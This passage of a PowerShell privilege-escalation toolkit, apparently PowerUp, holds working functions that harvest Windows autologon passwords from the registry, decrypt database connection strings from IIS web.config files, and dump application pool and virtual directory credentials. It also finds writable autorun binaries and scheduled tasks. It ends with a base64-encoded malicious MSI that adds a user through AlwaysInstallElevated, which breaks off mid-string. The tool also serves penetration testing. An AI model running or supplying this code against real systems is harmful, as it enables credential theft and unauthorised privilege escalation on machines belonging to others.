        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {            
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}   


function Get-VulnAutoRun {
<#
    .SYNOPSIS

        Returns HKLM autoruns where the current user can modify
        the binary/script (or its config) specified.

    .EXAMPLE

        PS C:\> Get-VulnAutoRun

        Return vulneable autorun binaries (or associated configs).
#>

    [CmdletBinding()]Param()
    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        
        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiableFile | ForEach-Object {
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Misc.
#
########################################################

function Get-VulnSchTask {
<#
    .SYNOPSIS

        Returns scheduled tasks where the current user can modify
        the script associated with the task action.

    .EXAMPLE

        PS C:\> Get-VulnSchTask

        Return vulnerable scheduled tasks.
#>

    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object {
        
        $TaskName = $_.Name
        $TaskXML = [xml] (Get-Content $_.FullName)
        $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

        # check schtask command
        $TaskXML.Task.Actions.Exec.Command | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'TaskName' $TaskName
            $Out | Add-Member Noteproperty 'TaskFilePath' $_
            $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
            $Out
        }

        # check schtask arguments
        $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'TaskName' $TaskName
            $Out | Add-Member Noteproperty 'TaskFilePath' $_
            $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
            $Out
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {
<#
    .SYNOPSIS

        Checks several locations for remaining unattended installation files, 
        which may have deployment credentials.

    .EXAMPLE

        PS C:\> Get-UnattendedInstallFile

        Finds any remaining unattended installation files.

    .LINK

        http://www.fuzzysecurity.com/tutorials/16.html
#>
    
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-Webconfig {   
<#
    .SYNOPSIS

        This script will recover cleartext and encrypted connection strings from all web.config 
        files on the system.  Also, it will decrypt them if needed.

        Author: Scott Sutherland - 2014, NetSPI
        Author: Antti Rantasaari - 2014, NetSPI

    .DESCRIPTION

        This script will identify all of the web.config files on the system and recover the  
        connection strings used to support authentication to backend databases.  If needed, the 
        script will also decrypt the connection strings on the fly.  The output supports the 
        pipeline which can be used to convert all of the results into a pretty table by piping 
        to format-table.
   
    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.

        PS C:\>get-webconfig        
        user   : s1admin
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\test2
        path   : C:\test2\web.config
        encr   : No

        user   : s1user
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\inetpub\wwwroot
        path   : C:\inetpub\wwwroot\web.config
        encr   : Yes
   
    .EXAMPLE

        Return a list of clear text and decrypted connect strings from web.config files.

        PS C:\>get-webconfig | Format-Table -Autosize

        user    pass       dbserv                vdir               path                          encr
        ----    ----       ------                ----               ----                          ----
        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 

     .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

     .NOTES

        Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
        for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
#>
    
    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("dbserv")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("path")
        $Null = $DataTable.Columns.Add("encr")

        # Get list of virtual directories in IIS 
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {            
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like "*password*") {
                            $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                            $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                            $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = "No"
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }  

                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName)){

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Remove-Item $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $aspnet_regiis_cmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like "*password*") {
                                    $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                    $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                    $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = "Yes"
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }  

                        }else{
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False                      
                        }
                    }else{
                        Write-Verbose "aspnet_regiis.exe does not exist in the default location."
                        $False
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 ) {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique       
        }
        else {

            # Status user
            Write-Verbose "No connectionStrings found."
            $False
        }     

    }
    else {
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 <#
    .SYNOPSIS

        This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
       
    .DESCRIPTION

        This script will decrypt and recover application pool and virtual directory passwords
        from the applicationHost.config file on the system.  The output supports the 
        pipeline which can be used to convert all of the results into a pretty table by piping 
        to format-table.
       
    .EXAMPLE

        Return application pool and virtual directory passwords from the applicationHost.config on the system.
           
        PS C:\>get-ApplicationHost         
        user    : PoolUser1
        pass    : PoolParty1!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool1
        user    : PoolUser2
        pass    : PoolParty2!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool2
        user    : VdirUser1
        pass    : VdirPassword1!
        type    : Virtual Directory
        vdir    : site1/vdir1/
        apppool : NA
        user    : VdirUser2
        pass    : VdirPassword2!
        type    : Virtual Directory
        vdir    : site2/
        apppool : NA
       
    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.
           
        PS C:\>get-ApplicationHost | Format-Table -Autosize
               
        user          pass               type              vdir         apppool
        ----          ----               ----              ----         -------
        PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
        PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2 
        VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA     
        VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA    

    .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

    .NOTES

        Author: Scott Sutherland - 2014, NetSPI
        Version: Get-ApplicationHost v1.0
        Comments: Should work on IIS 6 and Above
#>

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object { 
        
            #Get application pool name
            $PoolName = $_
        
            #Get username           
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd 
                    
            #Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd 

            #Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) 
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object { 

            #Get Virtual Directory Name
            $VdirName = $_
        
            #Get username           
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
                    
            #Get password       
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            #Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique       
        }
        else{
            # Status user
            Write-Verbose "No application pool or virtual directory passwords were found."
            $False
        }     
    }else{
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Write-UserAddMSI {
<#
    .SYNOPSIS

        Writes out a precompiled MSI installer that prompts for a user/group addition. 
        This function can be used to abuse Get-RegAlwaysInstallElevated.

    .EXAMPLE

        PS C:\> Write-UserAddMSI

        Writes the user add MSI to the local directory.
#>

    $Path = "UserAdd.msi"

    $Binary = "0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgAEAP7/DAAGAAAAAAAAAAEAAAABAAAAAQAAAAAAAAAAEAAAAgAAAAEAAAD+////AAAAAAAAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP3////+/////v///y8AAAAFAAAABgAAAP7///8IAAAACQAAAAoAAAALAAAADAAAAA0AAAAOAAAADwAAABAAAAARAAAAEgAAABMAAAAUAAAAFQAAACwAAAAYAAAAFgAAABkAAAAaAAAAGwAAABwAAAAdAAAAHgAAAB8AAAAgAAAAIQAAACIAAAAjAAAAJAAAACUAAAAmAAAAJwAAACgAAAApAAAAKgAAACsAAAD+////LQAAAC4AAAAwAAAA/v///zEAAAD+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9SAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAP//////////AgAAAIQQDAAAAAAAwAAAAAAAAEYAAAAAAAAAAAA